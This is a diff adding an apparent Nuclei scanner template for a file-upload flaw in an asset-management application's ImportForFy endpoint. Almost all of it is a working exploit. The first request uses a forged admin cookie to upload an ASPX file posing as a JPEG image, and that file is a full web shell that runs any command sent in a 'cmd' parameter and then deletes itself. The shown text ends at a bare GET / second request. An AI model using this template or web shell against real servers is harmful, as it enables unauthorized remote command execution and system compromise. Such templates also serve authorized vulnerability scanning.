@@ -1,0 +1,51 @@
+id: anyou_ImportForFy_upload
+info:
+  name: anyou_ImportForFy_upload
+  author: lemonlove7
+  severity: critical
+flow: http(1) && http(2)
+http:
+  - raw:
+      - |-
+        POST /Ams/Asset/ImportForFy HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: AnnYouDevBaseAdfv3adfUserCode=admin;
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+        
+        ------WebKitFormBoundary
+        Content-Disposition: form-data; name="NewFile"; filename="qazwe.aspx"
+        Content-Type: image/jpeg
+        
+        <%@ Page Language="Jscript" validateRequest="false" %>
+        <%
+        var c=new System.Diagnostics.ProcessStartInfo("cmd");
+        var e=new System.Diagnostics.Process();
+        var out:System.IO.StreamReader,EI:System.IO.StreamReader;
+        c.UseShellExecute=false;
+        c.RedirectStandardOutput=true;
+        c.RedirectStandardError=true;
+        e.StartInfo=c;
+        c.Arguments="/c " + Request.Item["cmd"];
+        e.Start();
+        out=e.StandardOutput;
+        EI=e.StandardError;
+        e.Close();
+        Response.Write(out.ReadToEnd() + EI.ReadToEnd());
+        System.IO.File.Delete(Request.PhysicalPath);
+        Response.End();%>
+        ------WebKitFormBoundary--
+    matchers:
+      - type: status
+        status:
+          - 200
+        internal: true
+      - type: word
+        part: body
+        words:
+          - 400
+        internal: true
+    matchers-condition: and
+  - raw:
+      - |-
+        GET / HTTP/1.1
+        Host: {{Hostname}}
